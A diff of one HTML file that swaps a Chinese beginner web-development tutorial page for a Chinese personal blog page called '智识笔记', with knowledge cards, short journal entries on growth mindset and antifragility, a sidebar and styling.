@@ -1,385 +1,807 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>Web开发技术文档</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>智识笔记 | 知识分享与正能量随笔</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* 全局样式 */
-        body {
-            overflow: hidden;
-            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
-            /* 使用Inter字体，备用系统字体 */
+        * {
             margin: 0;
             padding: 0;
-            background-color: #f8f8f8;
-            /* 浅色背景 */
-            color: #333;
-            /* 深色文本 */
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+        
+        :root {
+            --primary: #4a6fa5;
+            --secondary: #6b8cbc;
+            --accent: #ff9a76;
+            --light: #f8f9fa;
+            --dark: #343a40;
+            --success: #51cf66;
+            --text: #495057;
+            --text-light: #6c757d;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --radius: 12px;
+            --transition: all 0.3s ease;
+        }
+        
+        body {
+            background-color: #f5f7fa;
+            color: var(--text);
             line-height: 1.6;
-            -webkit-font-smoothing: antialiased;
-            /* 字体抗锯齿 */
-            -moz-osx-font-smoothing: grayscale;
-            /* 字体抗锯齿 */
+            overflow-x: hidden;
         }
-
+        
         .container {
-            max-width: 90%;
-            /* 适应移动端宽度 */
+            max-width: 1200px;
             margin: 0 auto;
-            /* 居中 */
-            padding: 20px 15px;
-            /* 内边距 */
+            padding: 0 20px;
         }
-
+        
         /* 头部样式 */
         header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 3rem 0;
             text-align: center;
-            padding: 20px 0;
-            background-color: #ffffff;
-            /* 白色背景 */
-            border-bottom: 1px solid #eee;
-            border-radius: 10px;
-            /* 圆角 */
-            margin-bottom: 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
-            /* 轻微阴影 */
+            margin-bottom: 2rem;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
         }
-
-        header h1 {
-            color: #2c3e50;
-            /* 深蓝色标题 */
-            margin-bottom: 10px;
-            font-size: 1.8em;
-            /* 适合移动端的字体大小 */
+        
+        header::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            z-index: 1;
         }
-
-        header p {
-            color: #555;
-            font-size: 0.9em;
-            margin: 0;
+        
+        .header-content {
+            position: relative;
+            z-index: 2;
         }
-
-        /* 目录样式 */
-        nav.toc {
-            background-color: #ffffff;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-
-        nav.toc h2 {
-            color: #2c3e50;
-            font-size: 1.5em;
-            margin-bottom: 15px;
-            border-bottom: 2px solid #eee;
-            padding-bottom: 10px;
+        
+        .tagline {
+            font-size: 1.3rem;
+            opacity: 0.9;
+            font-weight: 300;
+            max-width: 600px;
+            margin: 0 auto;
         }
-
-        nav.toc ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
+        
+        /* 导航栏 */
+        nav {
+            background-color: white;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-
-        nav.toc ul li {
-            margin-bottom: 8px;
+        
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
         }
-
-        nav.toc ul li a {
+        
+        .logo {
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .nav-links a {
             text-decoration: none;
-            color: #007bff;
-            /* 强调色：蓝色 */
-            font-weight: bold;
-            display: block;
-            padding: 5px 0;
-            transition: color 0.3s ease;
+            color: var(--text);
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
         }
-
-        nav.toc ul li a:hover {
-            color: #0056b3;
-            /* 强调色深色 */
+        
+        .nav-links a:hover {
+            color: var(--primary);
         }
-
+        
+        .nav-links a::after {
+            content: "";
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background-color: var(--primary);
+            transition: var(--transition);
+        }
+        
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+        
         /* 主要内容区域 */
-        main,
-        section {
-            background-color: #ffffff;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        .main-content {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
         }
-
-        h2 {
-            color: #2c3e50;
-            font-size: 1.5em;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #eee;
-            padding-bottom: 10px;
+        
+        /* 知识卡片 */
+        .knowledge-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
         }
-
-        h3 {
-            color: #34495e;
-            /* 更深的文本色 */
-            font-size: 1.2em;
-            margin-top: 25px;
-            margin-bottom: 15px;
+        
+        .card {
+            background: white;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            transition: var(--transition);
+            position: relative;
         }
-
-        p {
-            color: #555;
-            font-size: 0.95em;
-            margin-bottom: 15px;
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.12);
         }
-
-        img {
-            max-width: 100%;
-            /* 图片自适应宽度 */
-            height: auto;
-            border-radius: 8px;
-            /* 图片圆角 */
-            margin-top: 15px;
-            margin-bottom: 15px;
-            display: block;
-            /* 确保图片是块级元素 */
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-            /* 图片阴影 */
+        
+        .card-header {
+            padding: 1.5rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            position: relative;
+            overflow: hidden;
         }
-
-        /* 代码块样式 */
-        pre {
-            background-color: #2d2d2d;
-            /* 深色背景 */
-            color: #f8f8f2;
-            /* 浅色文本 */
-            padding: 15px;
-            border-radius: 8px;
-            overflow-x: auto;
-            /* 横向滚动 */
-            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
-            font-size: 0.9em;
-            line-height: 1.4;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        
+        .card-header::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 0 40px 40px 0;
+            border-color: transparent rgba(255,255,255,0.2) transparent transparent;
         }
-
-        code {
-            font-family: inherit;
-            font-size: inherit;
+        
+        .card-body {
+            padding: 1.5rem;
         }
-
-        /* 页脚样式 */
-        footer {
-            text-align: center;
-            padding: 20px 0;
-            color: #7f8c8d;
-            font-size: 0.85em;
-            border-top: 1px solid #eee;
-            margin-top: 20px;
-            background-color: #ffffff;
-            border-radius: 10px;
-            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.03);
+        
+        .card-title {
+            font-size: 1.4rem;
+            margin-bottom: 0.5rem;
         }
-
-        .footer-links a {
-            color: #007bff;
+        
+        .card-meta {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-light);
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+        
+        .card-content {
+            margin-bottom: 1.5rem;
+        }
+        
+        .read-more {
+            display: inline-block;
+            color: var(--primary);
             text-decoration: none;
-            margin: 0 8px;
-            font-weight: bold;
-            transition: color 0.3s ease;
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
         }
-
+        
+        .read-more:hover {
+            color: var(--accent);
+        }
+        
+        .read-more::after {
+            content: "→";
+            margin-left: 5px;
+            transition: var(--transition);
+        }
+        
+        .read-more:hover::after {
+            margin-left: 10px;
+        }
+        
+        /* 侧边栏 */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+        }
+        
+        .sidebar-widget {
+            background: white;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 1.5rem;
+            transition: var(--transition);
+        }
+        
+        .sidebar-widget:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+        
+        .widget-title {
+            font-size: 1.3rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--light);
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        /* 正能量语录 */
+        .positive-quote {
+            background: linear-gradient(135deg, #ffd89b, #19547b);
+            color: white;
+            border-radius: var(--radius);
+            padding: 2.5rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .positive-quote::before {
+            content: """;
+            position: absolute;
+            top: -20px;
+            left: 10px;
+            font-size: 8rem;
+            opacity: 0.2;
+            color: white;
+            font-family: Georgia, serif;
+        }
+        
+        .quote-text {
+            font-size: 1.4rem;
+            font-style: italic;
+            margin-bottom: 1rem;
+            position: relative;
+            z-index: 2;
+            line-height: 1.8;
+        }
+        
+        .quote-author {
+            font-weight: 500;
+            opacity: 0.9;
+        }
+        
+        /* 知识分类 */
+        .categories {
+            list-style: none;
+        }
+        
+        .categories li {
+            margin-bottom: 0.8rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 1px solid var(--light);
+            transition: var(--transition);
+        }
+        
+        .categories li:hover {
+            transform: translateX(5px);
+        }
+        
+        .categories a {
+            text-decoration: none;
+            color: var(--text);
+            display: flex;
+            justify-content: space-between;
+            transition: var(--transition);
+        }
+        
+        .categories a:hover {
+            color: var(--primary);
+        }
+        
+        .category-count {
+            background: var(--light);
+            color: var(--text-light);
+            border-radius: 20px;
+            padding: 0.2rem 0.6rem;
+            font-size: 0.8rem;
+        }
+        
+        /* 知识记录 */
+        .knowledge-record {
+            background: white;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 2rem;
+            margin-bottom: 2rem;
+            transition: var(--transition);
+        }
+        
+        .knowledge-record:hover {
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+        
+        .record-title {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .record-item {
+            margin-bottom: 1.5rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid var(--light);
+            transition: var(--transition);
+        }
+        
+        .record-item:hover {
+            padding-left: 10px;
+        }
+        
+        .record-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .record-date {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .record-content {
+            line-height: 1.7;
+        }
+        
+        /* 页脚 */
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 3rem 0;
+            margin-top: 3rem;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+        }
+        
+        .footer-column h3 {
+            font-size: 1.3rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            padding-bottom: 0.5rem;
+        }
+        
+        .footer-column h3::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 40px;
+            height: 2px;
+            background-color: var(--accent);
+        }
+        
+        .footer-links {
+            list-style: none;
+        }
+        
+        .footer-links li {
+            margin-bottom: 0.8rem;
+        }
+        
+        .footer-links a {
+            color: #adb5bd;
+            text-decoration: none;
+            transition: var(--transition);
+        }
+        
         .footer-links a:hover {
-            color: #0056b3;
+            color: white;
         }
+        
+        .social-links {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            text-decoration: none;
+            transition: var(--transition);
+        }
+        
+        .social-links a:hover {
+            background: var(--accent);
+            transform: translateY(-3px);
+        }
+        
+        .copyright {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #adb5bd;
+            font-size: 0.9rem;
+        }
+        
+        /* 主题切换按钮 */
+        .theme-toggle {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: var(--shadow);
+            z-index: 100;
+            transition: var(--transition);
+        }
+        
+        .theme-toggle:hover {
+            transform: scale(1.1);
+        }
+        
+        /* 响应式设计 */
+        @media (max-width: 992px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .nav-container {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .knowledge-cards {
+                grid-template-columns: 1fr;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+        }
+        
+        /* 动画效果 */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.6s ease forwards;
+        }
+        
+        .delay-1 { animation-delay: 0.1s; }
+        .delay-2 { animation-delay: 0.2s; }
+        .delay-3 { animation-delay: 0.3s; }
+        .delay-4 { animation-delay: 0.4s; }
+        .delay-5 { animation-delay: 0.5s; }
     </style>
-    <link rel="stylesheet" href="./static/css/style.css">
 </head>
-
 <body>
-    <div class="container">
-        <header>
-            <h1>Web开发技术文档</h1>
-            <p>从基础到进阶，全面掌握现代Web开发技术</p>
-        </header>
-
-        <nav class="toc">
-            <h2>目录</h2>
-            <ul>
-                <li><a href="#intro">1. 简介：Web开发基础</a></li>
-                <li><a href="#html-basics">2. HTML基础：构建网页结构</a></li>
-                <li><a href="#css-styling">3. CSS样式：美化页面</a></li>
-                <li><a href="#js-interactivity">4. JavaScript：实现交互功能</a></li>
-                <li><a href="#responsive-design">5. 响应式设计：适应多设备</a></li>
-            </ul>
-        </nav>
-
-        <main>
-            <section id="intro">
-                <h2>1. 简介：Web开发基础</h2>
-                <p>Web开发是构建网站和Web应用程序的过程。它通常涉及前端（用户可见部分）和后端（服务器、数据库等）。本章节将带您了解Web开发的基本概念和所需技术栈。</p>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="">
-                <p>一个完整的Web应用通常由HTML、CSS和JavaScript共同协作完成。HTML负责内容结构，CSS负责样式呈现，而JavaScript则负责实现页面的动态交互。</p>
-            </section>
-
-            <section id="html-basics">
-                <h2>2. HTML基础：构建网页结构</h2>
-                <h3>2.1 HTML文档结构</h3>
-                <p>HTML（超文本标记语言）是Web页面的骨架。每个HTML文档都遵循一个基本结构，包括<code>&lt;!DOCTYPE html&gt;</code>声明、<code>&lt;html&gt;</code>根元素、<code>&lt;head&gt;</code>头部信息和<code>&lt;body&gt;</code>主体内容。
-                </p>
-                <pre><code>
-&lt;!DOCTYPE html&gt;
-&lt;html lang="zh-CN"&gt;
-&lt;head&gt;
-    &lt;meta charset="UTF-8"&gt;
-    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-    &lt;title&gt;我的网页&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h1&gt;欢迎来到我的网站&lt;/h1&gt;
-    &lt;p&gt;这是一个简单的段落。&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-                </code></pre>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="">
-                <h3>2.2 常用HTML标签</h3>
-                <p>HTML提供了丰富的标签来组织内容，例如标题标签<code>&lt;h1&gt;</code>到<code>&lt;h6&gt;</code>，段落标签<code>&lt;p&gt;</code>，链接标签<code>&lt;a&gt;</code>，图像标签<code>&lt;img&gt;</code>等。
-                </p>
-            </section>
-
-            <section id="css-styling">
-                <h2>3. CSS样式：美化页面</h2>
-                <h3>3.1 CSS选择器与属性</h3>
-                <p>CSS（层叠样式表）用于控制Web页面的外观和布局。通过选择器，我们可以精确地选中HTML元素，并应用各种样式属性，如颜色、字体、大小和边距。</p>
-                <pre><code>
-/* 选中所有段落并设置文本颜色 */
-p {
-    color: #333;
-    font-size: 16px;
-    margin-bottom: 10px;
-}
-
-/* 选中ID为"header"的元素 */
-#header {
-    background-color: #f0f0f0;
-    padding: 20px;
-}
-
-/* 选中class为"button"的元素 */
-.button {
-    display: inline-block;
-    padding: 10px 15px;
-    background-color: #007bff;
-    color: white;
-    border-radius: 5px;
-}
-                </code></pre>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="">
-                <h3>3.2 盒模型与布局</h3>
-                <p>CSS盒模型是理解元素在页面上如何占据空间的关键。每个HTML元素都被视为一个矩形盒子，包含内容(content)、内边距(padding)、边框(border)和外边距(margin)。</p>
-            </section>
-
-            <section id="js-interactivity">
-                <h2>4. JavaScript：实现交互功能</h2>
-                <h3>4.1 JavaScript基础语法</h3>
-                <p>JavaScript是一种强大的脚本语言，用于实现Web页面的动态行为和交互功能。它可以修改HTML内容、CSS样式，响应用户事件，并与服务器进行数据交换。</p>
-                <pre><code>
-// 在控制台输出一条消息
-console.log("Hello, JavaScript!");
-
-// 获取HTML元素并修改其文本内容
-document.getElementById("myButton").addEventListener("click", function() {
-    document.getElementById("message").textContent = "按钮被点击了！";
-});
-
-// 定义一个函数
-function calculateSum(a, b) {
-    return a + b;
-}
-
-let result = calculateSum(5, 3);
-console.log("和是: " + result); // 输出 "和是: 8"
-                </code></pre>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="">
-                <h3>4.2 DOM操作与事件处理</h3>
-                <p>通过DOM（文档对象模型），JavaScript可以访问和操作HTML文档的各个部分。事件处理则允许我们对用户的行为（如点击、鼠标移动、键盘输入）做出响应。</p>
-            </section>
-
-            <section id="responsive-design">
-                <h2>5. 响应式设计：适应多设备</h2>
-                <p>响应式Web设计（RWD）是一种使网站能够适应不同屏幕尺寸和设备（如手机、平板、桌面）的技术。它主要通过CSS媒体查询和弹性布局实现。</p>
-                <pre><code>
-/* 当屏幕宽度小于600px时应用以下样式 */
-@media (max-width: 600px) {
-    .container {
-        padding: 10px;
-    }
-    nav ul li {
-        width: 100%; /* 导航项在小屏幕上占满一行 */
-        text-align: center;
-    }
-}
-                </code></pre>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="">
-                <p>通过媒体查询，我们可以为不同的设备尺寸定义不同的CSS规则，从而优化用户体验。</p>
-            </section>
-        </main>
-
-        <footer>
-            <p>&copy; 2023 Web开发技术文档. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#" aria-label="GitHub">GitHub</a> |
-                <a href="#" aria-label="文档主页">文档主页</a> |
-                <a href="#" aria-label="联系我们">联系我们</a>
+    <!-- 头部 -->
+    <header>
+        <div class="container header-content">
+            <h1 class="fade-in">知识分享与正能量随笔</h1>
+            <p class="tagline fade-in delay-1">记录知识，传递智慧，分享正能量 - 探索科学、玄学、数据统计、宇宙与AI的奥秘</p>
+        </div>
+    </header>
+    
+    <!-- 导航栏 -->
+    <nav>
+        <div class="container nav-container">
+            <div class="logo">
+                <i class="fas fa-brain"></i> 智识笔记
             </div>
-        </footer>
-        <div id="overlay">
-            <div id="loading_box" class="loading_container">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
+            <div class="nav-links">
+                <a href="#"><i class="fas fa-home"></i> 首页</a>
+                <a href="#"><i class="fas fa-book"></i> 知识库</a>
+                <a href="#"><i class="fas fa-pen"></i> 随笔</a>
+                <a href="#"><i class="fas fa-heart"></i> 正能量</a>
+                <a href="#"><i class="fas fa-user"></i> 关于我</a>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="container">
+        <!-- 正能量语录 -->
+        <div class="positive-quote fade-in delay-2">
+            <p class="quote-text">知识就像内功，积累越深厚，发挥出的力量越大。每天进步一点点，终将成就非凡。</p>
+            <p class="quote-author">—— 智识笔记</p>
+        </div>
+        
+        <!-- 主要内容区域 -->
+        <div class="main-content">
+            <!-- 左侧内容 -->
+            <div class="left-content">
+                <!-- 知识卡片 -->
+                <h2 style="margin-bottom: 1.5rem; color: var(--primary); display: flex; align-items: center; gap: 0.5rem;">
+                    <i class="fas fa-star"></i> 最新知识分享
+                </h2>
+                <div class="knowledge-cards">
+                    <div class="card fade-in delay-1">
+                        <div class="card-header">
+                            <h3 class="card-title">量子纠缠与意识关联</h3>
+                            <div class="card-meta">
+                                <span><i class="far fa-calendar"></i> 2023-10-15</span>
+                                <span><i class="far fa-folder"></i> 玄学与科学</span>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="card-content">
+                                <p>量子纠缠现象揭示了微观粒子之间的神秘联系，这种非局域性关联是否与人类意识存在某种联系？一些前沿科学家正在探索意识与量子物理之间的关系。</p>
+                            </div>
+                            <a href="#" class="read-more">阅读更多</a>
+                        </div>
+                    </div>
+                    
+                    <div class="card fade-in delay-2">
+                        <div class="card-header">
+                            <h3 class="card-title">AI大模型的涌现能力</h3>
+                            <div class="card-meta">
+                                <span><i class="far fa-calendar"></i> 2023-10-10</span>
+                                <span><i class="far fa-folder"></i> AI与程序</span>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="card-content">
+                                <p>当AI模型达到一定规模时，会突然展现出训练数据中未明确包含的能力，这种现象被称为"涌现"。了解这一现象对AI未来发展具有重要意义。</p>
+                            </div>
+                            <a href="#" class="read-more">阅读更多</a>
+                        </div>
+                    </div>
+                    
+                    <div class="card fade-in delay-3">
+                        <div class="card-header">
+                            <h3 class="card-title">数据统计中的认知偏差</h3>
+                            <div class="card-meta">
+                                <span><i class="far fa-calendar"></i> 2023-10-05</span>
+                                <span><i class="far fa-folder"></i> 数据统计</span>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="card-content">
+                                <p>人类大脑在处理统计信息时存在多种认知偏差，如确认偏误、幸存者偏差等。了解这些偏差有助于我们更客观地解读数据。</p>
+                            </div>
+                            <a href="#" class="read-more">阅读更多</a>
+                        </div>
+                    </div>
+                    
+                    <div class="card fade-in delay-4">
+                        <div class="card-header">
+                            <h3 class="card-title">暗物质与宇宙结构</h3>
+                            <div class="card-meta">
+                                <span><i class="far fa-calendar"></i> 2023-09-28</span>
+                                <span><i class="far fa-folder"></i> 宇宙探索</span>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="card-content">
+                                <p>暗物质虽然不可见，却构成了宇宙大部分质量，它的分布决定了星系和星系团的形成。探索暗物质是理解宇宙大尺度结构的关键。</p>
+                            </div>
+                            <a href="#" class="read-more">阅读更多</a>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 知识记录 -->
+                <div class="knowledge-record fade-in delay-5">
+                    <h2 class="record-title">
+                        <i class="fas fa-pen-fancy"></i> 知识记录随笔
+                    </h2>
+                    
+                    <div class="record-item">
+                        <div class="record-date">
+                            <i class="far fa-calendar"></i> 2023年10月18日
+                        </div>
+                        <div class="record-content">
+                            <p>今天学习了一个有趣的概念——"反脆弱"。与脆弱相对，反脆弱性是指那些不仅能抵抗冲击，还能从冲击中获益的事物。这让我思考如何在个人成长中培养反脆弱性，将挑战转化为成长机会。</p>
+                            <p style="margin-top: 10px;">联想到塔勒布的黑天鹅理论，我们生活在一个充满不确定性的世界，培养反脆弱性比追求稳定更为重要。</p>
+                        </div>
+                    </div>
+                    
+                    <div class="record-item">
+                        <div class="record-date">
+                            <i class="far fa-calendar"></i> 2023年10月12日
+                        </div>
+                        <div class="record-content">
+                            <p>阅读了关于"思维模型"的内容，意识到我们每个人都在使用各种思维模型来理解和应对世界。多元思维模型就像工具箱里的不同工具，面对不同问题选择合适工具，能大大提高决策质量。</p>
+                            <p style="margin-top: 10px;">查理·芒格强调要掌握不同学科的重要模型，形成"格栅思维"，这让我决定系统学习心理学、物理学和生物学的基础模型。</p>
+                        </div>
+                    </div>
+                    
+                    <div class="record-item">
+                        <div class="record-date">
+                            <i class="far fa-calendar"></i> 2023年10月5日
+                        </div>
+                        <div class="record-content">
+                            <p>了解到"成长型思维"与"固定型思维"的区别。拥有成长型思维的人相信能力可以通过努力培养，这使他们更愿意接受挑战，从失败中学习。这提醒我要在日常中培养成长型思维。</p>
+                            <p style="margin-top: 10px;">德韦克的研究表明，仅仅了解这两种思维模式的差异，就能显著改变一个人的学习和成就表现。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 右侧侧边栏 -->
+            <div class="sidebar">
+                <!-- 关于我 -->
+                <div class="sidebar-widget fade-in delay-3">
+                    <h3 class="widget-title">
+                        <i class="fas fa-user"></i> 关于我
+                    </h3>
+                    <p>一名热爱学习和分享的知识探索者，相信知识改变命运，积极心态塑造人生。专注于科学、玄学、数据统计、宇宙探索和AI技术的研究与分享。</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-weixin"></i></a>
+                        <a href="#"><i class="fab fa-github"></i></a>
+                        <a href="#"><i class="fab fa-bilibili"></i></a>
+                        <a href="#"><i class="fab fa-zhihu"></i></a>
+                    </div>
+                </div>
+                
+                <!-- 知识分类 -->
+                <div class="sidebar-widget fade-in delay-4">
+                    <h3 class="widget-title">
+                        <i class="fas fa-folder"></i> 知识分类
+                    </h3>
+                    <ul class="categories">
+                        <li>
+                            <a href="#">玄学与科学 <span class="category-count">12</span></a>
+                        </li>
+                        <li>
+                            <a href="#">AI与程序 <span class="category-count">8</span></a>
+                        </li>
+                        <li>
+                            <a href="#">数据统计 <span class="category-count">6</span></a>
+                        </li>
+                        <li>
+                            <a href="#">宇宙探索 <span class="category-count">10</span></a>
+                        </li>
+                        <li>
+                            <a href="#">思维模型 <span class="category-count">7</span></a>
+                        </li>
+                        <li>
+                            <a href="#">个人成长 <span class="category-count">15</span></a>
+                        </li>
+                    </ul>
+                </div>
+                
+                <!-- 正能量语录 -->
+                <div class="sidebar-widget fade-in delay-5">
+                    <h3 class="widget-title">
+                        <i class="fas fa-heart"></i> 每日正能量
+                    </h3>
+                    <p style="font-style: italic; color: var(--primary);">"生活不是等待风暴过去，而是学会在雨中跳舞。"</p>
+                    <p style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);">困难是成长的机会，挑战是进步的阶梯。保持积极心态，每一天都是新的开始。</p>
+                </div>
+                
+                <!-- 热门标签 -->
+                <div class="sidebar-widget fade-in delay-5">
+                    <h3 class="widget-title">
+                        <i class="fas fa-tags"></i> 热门标签
+                    </h3>
+                    <div style="display: flex; flex-wrap: wrap; gap: 0.5rem;">
+                        <span style="background: var(--light); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.8rem;">量子物理</span>
+                        <span style="background: var(--light); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.8rem;">机器学习</span>
+                        <span style="background: var(--light); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.8rem;">数据分析</span>
+                        <span style="background: var(--light); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.8rem;">宇宙奥秘</span>
+                        <span style="background: var(--light); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.8rem;">心灵成长</span>
+                        <span style="background: var(--light); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.8rem;">正念冥想</span>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
+    
+    <!-- 页脚 -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>智识笔记</h3>
+                    <p>记录知识，传递智慧，分享正能量。让我们一起在知识的海洋中探索，共同成长。</p>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>快速链接</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">首页</a></li>
+                        <li><a href="#">知识库</a></li>
+                        <li><a href="#">随笔记录</a></li>
+                        <li><a href="#">正能量分享</a></li>
+                        <li><a href="#">关于我</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>联系我</h3>
+                    <ul class="footer-links">
+                        <li><i class="fas fa-envelope"></i> contact@example.com</li>
+                        <li><i class="fas fa-map-marker-alt"></i> 中国 · 北京</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                <p>&copy; 2023 智识笔记 | 知识分享与正能量随笔</p>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- 主题切换按钮 -->
+    <div class="theme-toggle">
+        <i class="fas fa-palette"></i>
+    </div>
 
-    <script>
-        // JavaScript for smooth scrolling
